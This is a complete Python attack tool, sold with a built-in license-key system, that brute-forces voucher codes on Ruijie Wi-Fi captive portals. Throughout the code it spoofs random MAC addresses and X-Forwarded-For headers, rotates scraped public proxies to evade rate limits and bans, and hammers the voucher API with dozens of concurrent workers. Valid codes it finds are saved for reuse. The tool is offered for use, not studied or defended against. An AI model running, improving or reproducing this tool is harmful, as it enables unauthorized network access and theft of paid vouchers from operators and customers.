#!/usr/bin/env python3
"""
Ruijie Voucher Scanner v18.0 - SKY BLUE EDITION (PREMIUM UI)
- Premium Animated UI Design
- Single File License System
- SPEED OPTIMIZED: Bigger SID pool, faster fetchers, shorter timeouts
"""

import os
import sys
import json
import asyncio
import aiohttp
import re
import time
import socket
import requests
import urllib3
import random
import string
import hmac
import hashlib
from datetime import datetime
from urllib.parse import urlparse, parse_qs, quote

from rich.console import Console, Group
from rich.layout import Layout
from rich.panel import Panel
from rich.live import Live
from rich.table import Table
from rich.align import Align
from rich.text import Text
from rich.box import HEAVY, ROUNDED, DOUBLE, SIMPLE, MINIMAL
from rich.progress import Progress, BarColumn, TextColumn

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ==========================================
# ⚙️ SPEED TUNING
# ==========================================
CONCURRENCY = 40
TIMEOUT = 5
SID_POOL_MAX = 3000
SID_FETCHER_COUNT = 80
SID_FETCH_SLEEP = 0.001
PROXY_TIMEOUT = 1.5
DIRECT_TIMEOUT = 3
WORKER_SID_TIMEOUT = 0.2

console = Console()

OUI_POOL = [
    "64:CC:2E", "78:11:DC", "50:8F:4C", "8C:AA:B5", "9C:99:A0",
    "8C:77:12", "34:23:BA", "C0:BD:D1", "BC:14:85", "38:AA:3C",
    "3C:2E:F9", "F0:18:98", "8C:85:90", "BC:92:6B", "D0:81:7A",
    "60:15:C7", "4C:1A:95", "A4:50:46", "5C:1A:6F",
    "3C:AB:8E", "90:2B:34", "4C:74:03", "F4:8B:32",
]

SOFT_BAN_PATTERNS = ["request%20limited", "request limited", "too many", "banned", "blocked", "forbidden", "access denied"]
SID_PATTERNS = [r'sessionId=([A-Za-z0-9]{6,})', r'"sessionId"\s*:\s*"([^"]+)"', r'sessionId["\']?\s*[=:]\s*["\']?([A-Za-z0-9\-]{6,})']

# ==========================================
# 🔐 SINGLE FILE LICENSE SYSTEM
# ==========================================
SECRET_KEY = b"RuijieScanner_Secret_2024!@#"
LICENSE_FILE = ".rj_license"

DURATIONS = {
    "1": ("10 Mins", 10 * 60),
    "2": ("30 Mins", 30 * 60),
    "3": ("1 Hour", 1 * 60 * 60),
    "4": ("3 Hours", 3 * 60 * 60),
    "5": ("5 Hours", 5 * 60 * 60),
    "6": ("1 Day", 24 * 60 * 60),
    "7": ("15 Days", 15 * 24 * 60 * 60),
    "8": ("30 Days", 30 * 24 * 60 * 60)
}

def generate_key_ui():
    console.clear()
    console.print(Panel(Text("🔑 KEY GENERATOR MODE", style="bold white on sky_blue1", justify="center"), border_style="sky_blue1", box=DOUBLE, padding=(1, 2)))
    for k, v in DURATIONS.items():
        console.print(f"[bold sky_blue1]  {k}.[/bold sky_blue1] [white]{v[0]}[/white]")

    choice = input("\n[bold cyan]>> Select duration (1-8): [/bold cyan]").strip()
    if choice in DURATIONS:
        name, secs = DURATIONS[choice]
        expiry = int(time.time() + secs)
        data = f"{choice}-{expiry}".encode()
        sig = hmac.new(SECRET_KEY, data, hashlib.sha256).hexdigest()[:10].upper()
        key = f"{choice}-{expiry}-{sig}"

        console.print(Panel(
            Align.center(Text.assemble(
                ("Generated Key for ", "bold white"),
                (name, "bold yellow"),
                ("\n\n", ""),
                (f"👉 {key} 👈", "bold white on sky_blue1")
            )),
            border_style="green", box=HEAVY, padding=(1, 2)
        ))
    else:
        console.print("[bold red][-] Invalid choice![/bold red]")
    sys.exit(0)

def check_license():
    if os.path.exists(LICENSE_FILE):
        try:
            with open(LICENSE_FILE, "r") as f:
                data = json.load(f)
                key = data.get("key", "")
                code, exp_str, sig = key.split("-")
                expiry = int(exp_str)
                expected_sig = hmac.new(SECRET_KEY, f"{code}-{exp_str}".encode(), hashlib.sha256).hexdigest()[:10].upper()

                if hmac.compare_digest(sig, expected_sig):
                    if time.time() < expiry:
                        remaining = expiry - time.time()
                        days = int(remaining // 86400)
                        hours = int((remaining % 86400) // 3600)
                        mins = int((remaining % 3600) // 60)
                        console.print(Panel(
                            Align.center(Text(f"✅ License Valid! Time left: {days}d {hours}h {mins}m", style="bold green")),
                            border_style="green", box=ROUNDED
                        ))
                        time.sleep(1)
                        return True
                    else:
                        console.print("[bold red][-] License Expired! Please buy a new key.[/bold red]")
                else:
                    console.print("[bold red][-] Invalid License File![/bold red]")
        except Exception:
            pass

    console.print(Panel(
        Align.center(Text.assemble(
            ("🔒 ", "bold red"),
            ("ACTIVATION REQUIRED", "bold white on red"),
            ("\n\n", ""),
            ("Please enter your license key to continue", "italic white")
        )),
        border_style="red", box=DOUBLE, padding=(1, 2)
    ))
    user_key = input("[bold cyan]>> Enter your Key: [/bold cyan]").strip()

    try:
        code, exp_str, sig = user_key.split("-")
        expiry = int(exp_str)
        expected_sig = hmac.new(SECRET_KEY, f"{code}-{expiry}".encode(), hashlib.sha256).hexdigest()[:10].upper()

        if hmac.compare_digest(sig, expected_sig):
            if time.time() < expiry:
                with open(LICENSE_FILE, "w") as f:
                    json.dump({"key": user_key, "expiry": expiry}, f)
                console.print("[bold green][+] Activation Successful![/bold green]")
                time.sleep(1)
                return True
            else:
                console.print("[bold red][-] This key has already expired![/bold red]")
        else:
            console.print("[bold red][-] Invalid License Key![/bold red]")
    except Exception:
        console.print("[bold red][-] Invalid Key Format![/bold red]")

    return False

# ==========================================
# 🚀 HELPER FUNCTIONS
# ==========================================

def extract_sid_from_text(text):
    if not text: return None
    for pat in SID_PATTERNS:
        m = re.search(pat, text)
        if m: return m.group(1)
    return None

def extract_sign_ts_from_text(text):
    sign = None; ts = None
    if not text: return sign, ts
    m = re.search(r'[?&]sign=([^&"\'\s]+)', text)
    if m: sign = m.group(1)
    m = re.search(r'[?&]timestamp=([^&"\'\s]+)', text)
    if m: ts = m.group(1)
    return sign, ts

TIME_LEFT_KEYS = [
    'remainingTime', 'remainTime', 'leftTime', 'timeLeft', 'surplusTime',
    'validTime', 'availTime', 'availableTime', 'duration', 'durationLeft',
    'expireIn', 'expiresIn', 'ttl', 'remaining_seconds', 'remainingSeconds',
    'remain_seconds', 'time_remaining', 'expiredTime', 'expireTime',
    'expiresAt', 'validUntil', 'expiryTime', 'endTime', 'end_time',
]

def _to_human(seconds):
    try: seconds = int(float(seconds))
    except (TypeError, ValueError): return None
    if seconds <= 0: return "expired"
    d, rem = divmod(seconds, 86400)
    h, rem = divmod(rem, 3600)
    m, s = divmod(rem, 60)
    parts = []
    if d: parts.append(f"{d}d")
    if h: parts.append(f"{h}h")
    if m and not d: parts.append(f"{m}m")
    if s and not d and not h: parts.append(f"{s}s")
    return " ".join(parts) if parts else f"{s}s"

def _parse_hm_unit(text):
    s = str(text).strip().lower()
    total = 0; found = False
    for num, unit in re.findall(r'(\d+(?:\.\d+)?)\s*([dhms])', s):
        try: n = float(num)
        except ValueError: continue
        found = True
        if unit == 'd': total += n * 86400
        elif unit == 'h': total += n * 3600
        elif unit == 'm': total += n * 60
        elif unit == 's': total += n
    if found: return int(total)
    if re.fullmatch(r'\d+', s): return int(s)
    return None

def _find_time_value(obj, depth=0):
    if depth > 5 or obj is None: return None, None
    if isinstance(obj, dict):
        for k in TIME_LEFT_KEYS:
            if k in obj: return k, obj[k]
        for k, v in obj.items():
            if isinstance(k, str) and k.lower() in [x.lower() for x in TIME_LEFT_KEYS]: return k, v
        for v in obj.values():
            fk, fv = _find_time_value(v, depth + 1)
            if fk is not None: return fk, fv
    elif isinstance(obj, list):
        for item in obj:
            fk, fv = _find_time_value(item, depth + 1)
            if fk is not None: return fk, fv
    return None, None

def parse_remaining_time(result):
    if not isinstance(result, dict): return None, None
    key, val = _find_time_value(result)
    if key is None or val is None: return None, None
    raw = val
    if isinstance(val, (int, float)):
        try: n = int(val)
        except (TypeError, ValueError): n = 0
        if n > 10**12: n //= 1000
        if n > 10**9:
            delta = n - int(datetime.now().timestamp())
            return _to_human(delta), raw
        return _to_human(n), raw
    if isinstance(val, str):
        s = val.strip()
        if not s: return None, raw
        sec = _parse_hm_unit(s)
        if sec is not None: return _to_human(sec), raw
    return None, raw

def clear_screen(): os.system('cls' if os.name == 'nt' else 'clear')
def fmt_elapsed(seconds):
    seconds = int(seconds)
    h = seconds // 3600; m = (seconds % 3600) // 60; s = seconds % 60
    return f"{h:02d}:{m:02d}:{s:02d}"

def get_gateway_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]; s.close()
        parts = ip.split('.'); parts[-1] = '1'
        return '.'.join(parts)
    except Exception: return "192.168.110.1"

def extract_params_from_url(url):
    parsed = urlparse(url); query = parse_qs(parsed.query); params = {}
    mapping = {'gw_id': 'gw_id', 'gw_sn': 'gw_sn', 'gw_address': 'gw_address', 'gw_port': 'gw_port', 'ip': 'ip', 'mac': 'mac', 'slot_num': 'slot_num', 'nasip': 'nasip', 'ssid': 'ssid', 'url': 'url', 'chap_id': 'chap_id', 'chap_challenge': 'chap_challenge'}
    for key, mk in mapping.items():
        if key in query: params[mk] = query[key][0]
    if 'RES' in query: params['RES'] = query['RES'][0]
    return params

def auto_detect_portal():
    session = requests.Session()
    session.headers.update({'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'})
    try:
        r = session.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
        if "ruijienetworks" in r.url: return r.url
    except Exception: pass
    for gw in [get_gateway_ip(), "192.168.110.1", "192.168.0.1"]:
        try:
            res = session.get(f"http://{gw}", timeout=3, allow_redirects=True)
            if "ruijienetworks" in res.url: return res.url
        except Exception: pass
    return None

class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.index = 0

    async def fetch(self):
        urls = [
            "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
            "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
            "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt"
        ]
        async with aiohttp.ClientSession() as session:
            for url in urls:
                try:
                    async with session.get(url, timeout=5) as r:
                        if r.status == 200:
                            text = await r.text()
                            for line in text.splitlines():
                                line = line.strip()
                                if line and ":" in line:
                                    self.proxies.append(f"http://{line}")
                except Exception: pass
        self.proxies = list(set(self.proxies))

    async def get_proxy(self):
        if not self.proxies: return None
        self.index = (self.index + 1) % len(self.proxies)
        return self.proxies[self.index]
class VoucherScanner:
    def __init__(self):
        self.mode = "num"
        self.portal_url = ""
        self.length = 6

        self.proxy_mgr = ProxyManager()
        self.sid_pool = asyncio.Queue(maxsize=SID_POOL_MAX)
        self.voucher_queue = asyncio.Queue()

        self._stop = False
        self._display_active = False
        self._live = None
        self._start_time = time.time()

        self._state = {
            'total': 0, 'checked': 0, 'speed': 0, 'percentage': 0,
            'elapsed': '00:00:00', 'found': [], 'valid': [], 'dead': [],
            'status': 'Initializing...', 'session': 'None', 'current_code': '----',
            'sid_pool': 0, 'workers': 0, 'proxies': 0,
            'hits_rate': 0.0, 'eta': '--:--:--'
        }

        self.params = {
            "stage": "portal", "gw_id": "c4b25be7d323", "gw_sn": "H1U320P00210A",
            "gw_address": "192.168.7.1", "gw_port": "2060", "ip": "192.168.110.1",
            "mac": "00:00:00:00:00:00", "slot_num": "14", "nasip": "192.168.1.193",
            "ssid": "VLAN7", "ustate": "0", "mac_req": "1",
            "url": "http://connectivitycheck.gstatic.com/generate_204",
            "chap_id": r"\245", "chap_challenge": r"\124\275\237\157\043\371\050\266\227\342\155\205\324\112\266\067"
        }

    def _gen_mac(self):
        oui = random.choice(OUI_POOL)
        return f"{oui}:{random.randint(0x00,0xff):02x}:{random.randint(0x00,0xff):02x}:{random.randint(0x00,0xff):02x}".lower()

    def _gen_ip(self): return f"192.168.110.{random.randint(2, 254)}"

    def _host(self):
        pu = self.portal_url or str(self.params.get("url", ""))
        if "portal-mm" in pu: return "portal-mm-as.ruijienetworks.com"
        return "portal-as.ruijienetworks.com"

    def apply_params_from_url(self, url):
        self.portal_url = url
        for k, v in extract_params_from_url(url).items():
            if k in self.params: self.params[k] = v

    def generate_voucher(self):
        if self.mode == "num": return str(random.randint(0, 10**self.length - 1)).zfill(self.length)
        elif self.mode == "eng": return ''.join(random.choices(string.ascii_lowercase, k=self.length))
        elif self.mode == "mix": return ''.join(random.choices(string.ascii_lowercase + string.digits, k=self.length))
        return "0" * self.length

    # ==========================================
    # 🎨 PREMIUM UI LAYOUT
    # ==========================================
    def make_header(self):
        t = int(time.time() * 2) % 3
        colors = ["bold white on sky_blue1", "bold white on sky_blue2", "bold white on sky_blue3"]
        header_color = colors[t]

        header_text = Text()
        header_text.append("╔══════════════════════════════════════════════════════════════╗\n", style="bold sky_blue1")
        header_text.append("║                                                                ║\n", style="bold sky_blue1")
        header_text.append("║        ☁️   S K Y   B L U E   S C A N N E R   ☁️               ║\n", style=header_color)
        header_text.append("║                                                                ║\n", style="bold sky_blue1")
        header_text.append("║              Ruijie Voucher Scanner v18.0 - PREMIUM            ║\n", style="bold cyan")
        header_text.append("║                                                                ║\n", style="bold sky_blue1")
        header_text.append("╚══════════════════════════════════════════════════════════════╝", style="bold sky_blue1")

        return Panel(Align.center(header_text), border_style="sky_blue1", box=DOUBLE, padding=(0, 1))

    def make_stats_bar(self):
        s = self._state
        speed = s['speed']
        if speed >= 1000: speed_style = "bold green"
        elif speed >= 500: speed_style = "bold yellow"
        elif speed >= 100: speed_style = "bold cyan"
        else: speed_style = "bold red"

        stats_table = Table.grid(padding=(0, 2), expand=True)
        for _ in range(4): stats_table.add_column(ratio=1)

        stats_table.add_row(
            Panel(Align.center(Text.assemble(("⚡ SPEED\n", "dim white"), (f"{speed:,}", speed_style), ("/min", "dim white"))), border_style="yellow", box=ROUNDED, padding=(0, 1)),
            Panel(Align.center(Text.assemble(("📊 CHECKED\n", "dim white"), (f"{s['checked']:,}", "bold cyan"), (f"/{s['total']:,}", "dim white"))), border_style="cyan", box=ROUNDED, padding=(0, 1)),
            Panel(Align.center(Text.assemble(("🎯 HITS\n", "dim white"), (f"{len(s['found']) + len(s['valid'])}", "bold green"), (f"  ({s['hits_rate']:.2f}/k)", "dim white"))), border_style="green", box=ROUNDED, padding=(0, 1)),
            Panel(Align.center(Text.assemble(("⏱️ ELAPSED\n", "dim white"), (s['elapsed'], "bold magenta"), (f"  ETA {s['eta']}", "dim white"))), border_style="magenta", box=ROUNDED, padding=(0, 1)),
        )
        return stats_table

    def make_progress_panel(self):
        s = self._state
        pct = s['percentage']
        bar_width = 40
        filled = int(bar_width * pct / 100)
        bar = "█" * filled + "░" * (bar_width - filled)

        if pct >= 75: bar_color = "green"
        elif pct >= 50: bar_color = "yellow"
        elif pct >= 25: bar_color = "cyan"
        else: bar_color = "red"

        progress_text = Text()
        progress_text.append(f"[{bar}] ", style=f"bold {bar_color}")
        progress_text.append(f"{pct:.2f}%", style="bold white")

        info_text = Text()
        info_text.append("  📡 Session: ", style="dim white")
        info_text.append(f"{s['session'][:20]}...", style="cyan")
        info_text.append("   🔌 SID Pool: ", style="dim white")
        info_text.append(f"{s['sid_pool']:,}", style="green")
        info_text.append("   👷 Workers: ", style="dim white")
        info_text.append(f"{s['workers']}", style="yellow")
        info_text.append("   🌐 Proxies: ", style="dim white")
        info_text.append(f"{s['proxies']:,}", style="magenta")

        content = Group(Align.center(progress_text), Align.center(info_text))
        return Panel(content, title="[bold white]⚙️ SCANNING PROGRESS[/bold white]", subtitle=f"[dim]Status: {s['status']}[/dim]", border_style="sky_blue1", box=HEAVY, padding=(0, 1))

    def make_hits_panel(self):
        s = self._state
        hits_table = Table(show_header=True, header_style="bold white on sky_blue1", expand=True, box=MINIMAL, padding=(0, 1))
        hits_table.add_column("TYPE", width=10, justify="center")
        hits_table.add_column("TIME", width=9, justify="center")
        hits_table.add_column("VOUCHER CODE", justify="center")
        hits_table.add_column("TIME LEFT", width=15, justify="center")
        hits_table.add_column("DETAILS", justify="left")

        all_hits = []
        for v, t, _url, tl in s['found']: all_hits.append(("FOUND", t, v, tl, "🎯 Full Access"))
        for v, t, tl in s['valid']: all_hits.append(("VALID", t, v, tl, "✅ Valid Code"))
        for v, t, kind in s['dead']:
            if kind == "STA_LIMIT": all_hits.append(("LIMIT", t, v, "-", "⚠️ Station Limit"))
            else: all_hits.append(("EXPIRED", t, v, "-", "❌ Expired"))

        for kind, t, v, tl, details in all_hits[-15:]:
            if kind == "FOUND":
                hits_table.add_row("[bold white on green] 🎯 FOUND [/bold white on green]", f"[dim]{t}[/dim]", f"[bold green]{v}[/bold green]", f"[bold green]{tl or '-'}[/bold green]", f"[dim]{details}[/dim]")
            elif kind == "VALID":
                hits_table.add_row("[bold white on cyan] ✅ VALID [/bold white on cyan]", f"[dim]{t}[/dim]", f"[bold cyan]{v}[/bold cyan]", f"[cyan]{tl or '-'}[/cyan]", f"[dim]{details}[/dim]")
            elif kind == "LIMIT":
                hits_table.add_row("[bold black on yellow] ⚠️ LIMIT [/bold black on yellow]", f"[dim]{t}[/dim]", f"[yellow]{v}[/yellow]", "[dim]-[/dim]", f"[dim]{details}[/dim]")
            else:
                hits_table.add_row("[bold white on red] ❌ EXP [/bold white on red]", f"[dim]{t}[/dim]", f"[dim]{v}[/dim]", "[dim]-[/dim]", f"[dim]{details}[/dim]")

        if not all_hits:
            hits_table.add_row("", "", "[dim italic]No hits yet... scanning...[/dim italic]", "", "")

        total = len(s['found']) + len(s['valid']) + len(s['dead'])
        title = f"[bold white]🎯 HITS DASHBOARD[/bold white] [dim](F:{len(s['found'])} | V:{len(s['valid'])} | D:{len(s['dead'])} | Total:{total})[/dim]"
        return Panel(hits_table, title=title, border_style="green", box=ROUNDED, padding=(0, 1))

    def make_current_code_panel(self):
        s = self._state
        dots = "." * (int(time.time() * 3) % 4)
        return Panel(Align.center(Text.assemble(("🔍 CURRENT CODE\n", "dim white"), (s['current_code'], "bold white on sky_blue1"), (f"  {dots}", "dim white"))), border_style="cyan", box=ROUNDED, padding=(0, 1))

    def make_layout(self):
        layout = Layout()
        layout.split_column(
            Layout(name="header", size=10),
            Layout(name="stats", size=5),
            Layout(name="progress", size=5),
            Layout(name="middle", size=5),
            Layout(name="hits", ratio=1),
        )
        layout["middle"].split_row(Layout(name="current", ratio=1), Layout(name="info", ratio=2))

        layout["header"].update(self.make_header())
        layout["stats"].update(self.make_stats_bar())
        layout["progress"].update(self.make_progress_panel())
        layout["current"].update(self.make_current_code_panel())
        layout["hits"].update(self.make_hits_panel())

        info_table = Table.grid(padding=(0, 1), expand=True)
        info_table.add_column(ratio=1)
        info_table.add_column(ratio=1)
        info_table.add_row(
            Text.assemble(("Mode: ", "dim white"), (self.mode.upper(), "bold cyan")),
            Text.assemble(("Length: ", "dim white"), (f"{self.length}", "bold yellow")),
        )
        info_table.add_row(
            Text.assemble(("Host: ", "dim white"), (self._host()[:20], "bold green")),
            Text.assemble(("Portal: ", "dim white"), ("Detected" if self.portal_url else "Manual", "bold magenta")),
        )
        layout["info"].update(Panel(info_table, title="[bold white]ℹ️ INFO[/bold white]", border_style="blue", box=ROUNDED, padding=(0, 1)))
        return layout

    def _render(self):
        if not self._display_active: return
        try: self._live.update(self.make_layout())
        except Exception: pass

    async def _ui_loop(self):
        while self._display_active:
            self._render()
            await asyncio.sleep(0.1)

    def _record_hit(self, voucher, kind, logon_url="", tl=""):
        clock = datetime.now().strftime("%H:%M:%S")
        try:
            with open("found_ruijie.txt", "a") as f:
                f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{clock}] [{kind}] {voucher} {logon_url} {tl}\n")
        except: pass
        if kind == "FOUND": self._state['found'].append((voucher, clock, logon_url, tl))
        elif kind == "VALID": self._state['valid'].append((voucher, clock, tl))
        elif kind in ("STA_LIMIT", "EXPIRED"): self._state['dead'].append((voucher, clock, kind))

    async def sid_fetcher(self, session):
        while not self._stop:
            try:
                if self.sid_pool.full():
                    await asyncio.sleep(0.2)
                    continue

                mac = self._gen_mac()
                ip = self._gen_ip()
                proxy = await self.proxy_mgr.get_proxy()

                headers = {
                    'User-Agent': f'Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Dragon-{mac}',
                    'Client-Mac': mac,
                    'X-Forwarded-For': ip,
                }

                temp_params = self.params.copy()
                temp_params['mac'] = mac
                temp_params['ip'] = ip
                params_str = "&".join([f"{k}={quote(str(v))}" for k, v in temp_params.items()])
                url = f"https://{self._host()}/api/auth/wifidog?{params_str}"

                sid = None; sign = None; ts = None

                if proxy:
                    try:
                        async with session.get(url, headers=headers, proxy=proxy, timeout=PROXY_TIMEOUT, allow_redirects=False, ssl=False) as resp:
                            loc = resp.headers.get('Location', '')
                            if loc:
                                q = parse_qs(urlparse(loc).query)
                                sid = q.get('sessionId', [None])[0]
                                sign = q.get('sign', [None])[0]
                                ts = q.get('timestamp', [None])[0]
                    except: pass

                if not sid:
                    try:
                        async with session.get(url, headers=headers, timeout=DIRECT_TIMEOUT, allow_redirects=False, ssl=False) as resp:
                            loc = resp.headers.get('Location', '')
                            if loc:
                                q = parse_qs(urlparse(loc).query)
                                sid = q.get('sessionId', [None])[0]
                                sign = q.get('sign', [None])[0]
                                ts = q.get('timestamp', [None])[0]
                    except: pass

                if sid:
                    await self.sid_pool.put({'sid': sid, 'mac': mac, 'ip': ip, 'proxy': proxy, 'sign': sign, 'ts': ts, 'used': 0})
                    self._state['sid_pool'] = self.sid_pool.qsize()

            except Exception:
                pass
            await asyncio.sleep(SID_FETCH_SLEEP)

    async def scan_worker(self, session):
        while not self._stop:
            try:
                try:
                    sid_data = await asyncio.wait_for(self.sid_pool.get(), timeout=WORKER_SID_TIMEOUT)
                except asyncio.TimeoutError:
                    self._state['status'] = "⏳ Waiting for SID..."
                    await asyncio.sleep(0.01)
                    continue

                try:
                    voucher = await asyncio.wait_for(self.voucher_queue.get(), timeout=0.2)
                except asyncio.TimeoutError:
                    await self.sid_pool.put(sid_data)
                    continue

                self._state['workers'] += 1
                self._state['session'] = sid_data['sid']

                url = f"https://{self._host()}/api/auth/voucher/?lang=en_US"
                headers = {
                    "content-type": "application/json",
                    "user-agent": "Mozilla/5.0 (Linux; Android 12)",
                    "referer": f"https://{self._host()}/download/static/maccauth/src/index.html?sessionId={sid_data['sid']}",
                    "Client-Mac": sid_data['mac'],
                    "X-Forwarded-For": sid_data['ip'],
                }
                payload = {"accessCode": voucher, "sessionId": sid_data['sid'], "apiVersion": 1}
                if sid_data['sign']: payload["sign"] = sid_data['sign']
                if sid_data['ts']: payload["timestamp"] = sid_data['ts']

                status = 'INVALID'; tl = ""; logon = ""

                try:
                    async with session.post(url, json=payload, headers=headers, proxy=sid_data['proxy'], ssl=False, timeout=TIMEOUT, allow_redirects=True) as resp:
                        text = await resp.text()
                        final_url = str(resp.url).lower()

                        if resp.status == 429 or any(p in final_url for p in SOFT_BAN_PATTERNS):
                            status = 'DEAD_SID'
                        else:
                            try: result = json.loads(text)
                            except: result = {}
                            msg = str(result.get("message", "")).lower()

                            if "session" in msg and ("expired" in msg or "invalid" in msg or "timed out" in msg): status = 'DEAD_SID'
                            elif any(p in msg for p in SOFT_BAN_PATTERNS): status = 'DEAD_SID'
                            elif "sta limit" in msg or "station limit" in msg: status = 'STA_LIMIT'
                            elif "expired" in msg: status = 'EXPIRED'
                            else:
                                success = False
                                if isinstance(result, dict):
                                    if result.get("success") is True: success = True
                                    if not success and isinstance(result.get("result"), dict):
                                        logon = result["result"].get("logonUrl") or result["result"].get("logon_url")
                                        if logon: success = True
                                    if not success and str(result.get("result")) == "0": success = True
                                    if not success and result.get("error") is None and "result" in result:
                                        if result.get("result") not in (None, False): success = True
                                if not success:
                                    low = text.lower()
                                    if '"result":0' in text or '"error":null' in low or '"success":true' in low: success = True

                                if success:
                                    status = 'FOUND' if logon else 'VALID'
                                    tl = parse_remaining_time(result)[0] or ""
                                elif any(k in msg for k in ("authentication failed", "incorrect", "invalid code", "not found", "wrong")): status = 'INVALID'
                                else: status = 'INVALID'
                except Exception:
                    status = 'DEAD_SID'

                self._state['checked'] += 1
                self._state['current_code'] = voucher

                if status in ('DEAD_SID', 'INVALID'):
                    if status == 'INVALID':
                        sid_data['used'] += 1
                        if sid_data['used'] < 10: await self.sid_pool.put(sid_data)
                else:
                    if not self.sid_pool.full(): await self.sid_pool.put(sid_data)
                    self._record_hit(voucher, status, logon, tl)

                if not self._stop:
                    await self.voucher_queue.put(self.generate_voucher())

            except asyncio.CancelledError:
                break
            except Exception:
                pass
            finally:
                self._state['workers'] -= 1
                self._state['sid_pool'] = self.sid_pool.qsize()

    async def run(self, session, total_codes):
        self._state['total'] = total_codes
        self._state['status'] = "Fetching Proxies..."

        await self.proxy_mgr.fetch()
        self._state['proxies'] = len(self.proxy_mgr.proxies)

        for _ in range(CONCURRENCY * 2):
            self.voucher_queue.put_nowait(self.generate_voucher())

        self._display_active = True
        self._live = Live(self.make_layout(), refresh_per_second=10, screen=True)
        self._live.start()
        ui_task = asyncio.create_task(self._ui_loop())

        sid_tasks = [asyncio.create_task(self.sid_fetcher(session)) for _ in range(SID_FETCHER_COUNT)]
        scan_tasks = [asyncio.create_task(self.scan_worker(session)) for _ in range(CONCURRENCY)]

        start_time = time.time()
        while self._state['checked'] < total_codes and not self._stop:
            elapsed = time.time() - start_time
            self._state['speed'] = int(self._state['checked'] / elapsed * 60) if elapsed > 0 else 0
            self._state['percentage'] = (self._state['checked'] / total_codes) * 100
            self._state['elapsed'] = fmt_elapsed(elapsed)

            hits = len(self._state['found']) + len(self._state['valid'])
            if self._state['checked'] > 0:
                self._state['hits_rate'] = (hits / self._state['checked']) * 1000

            if self._state['speed'] > 0:
                remaining_codes = total_codes - self._state['checked']
                eta_secs = int((remaining_codes / self._state['speed']) * 60)
                self._state['eta'] = fmt_elapsed(eta_secs)

            await asyncio.sleep(0.5)

        self._stop = True
        for t in sid_tasks + scan_tasks: t.cancel()

        self._display_active = False
        ui_task.cancel()
        self._live.stop()
        console.print(f"\n[bold green]COMPLETED: {self._state['checked']} codes in {self._state['elapsed']}[/bold green]")
async def main():
    clear_screen()

    if len(sys.argv) > 1 and sys.argv[1].lower() == 'keygen':
        generate_key_ui()
        return

    if not check_license():
        input("\n[red]Press Enter to exit...[/red]")
        sys.exit(1)

    # 🌟 SKY BLUE LOGO MAIN
    logo_main = Text()
    logo_main.append("☁️ WELCOME TO SKY BLUE SCANNER ☁️\n", style="bold white on sky_blue1")
    logo_main.append("RUIJIE SCANNER v18.0 - OVERLORD (PREMIUM)\n", style="bold cyan")
    logo_main.append("High-Speed Voucher Cracking System", style="italic green")

    console.print(Panel(Align.center(logo_main), border_style="sky_blue1", box=DOUBLE, padding=(1, 2)))

    scanner = VoucherScanner()
    portal_url = auto_detect_portal()

    if portal_url:
        scanner.apply_params_from_url(portal_url)
        console.print("[bold green][+][/bold green] URL fetched successfully!")
    else:
        console.print("[bold red][-][/bold red] Auto-detect failed. Please paste URL manually.")
        url_input = input("[yellow]>> Paste URL: [/yellow]").strip()
        if not url_input: return
        scanner.apply_params_from_url(url_input)

    async with aiohttp.ClientSession() as session:
        console.print(Panel(Text("Choose Scan Type:\n  1. NUM (0-9)\n  2. ENG (a-z)\n  3. MIX (a-z + 0-9)", style="cyan"), border_style="cyan", box=HEAVY))
        scan_type = input("[yellow]>> [/yellow]").strip()
        scanner.mode = {"1": "num", "2": "eng", "3": "mix"}.get(scan_type, "num")

        lc = input("[yellow]>> Voucher length (6/7/8) [6]: [/yellow]").strip()
        scanner.length = int(lc) if lc in ('7', '8') else 6

        total = 100000 if scanner.length == 6 else (500000 if scanner.length == 7 else 1000000)
        await scanner.run(session, total)

    console.print(Panel(Align.center(Text("Done!", style="bold green")), border_style="sky_blue1", box=HEAVY))
    input("[blue][*][/blue] Press Enter to exit...")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass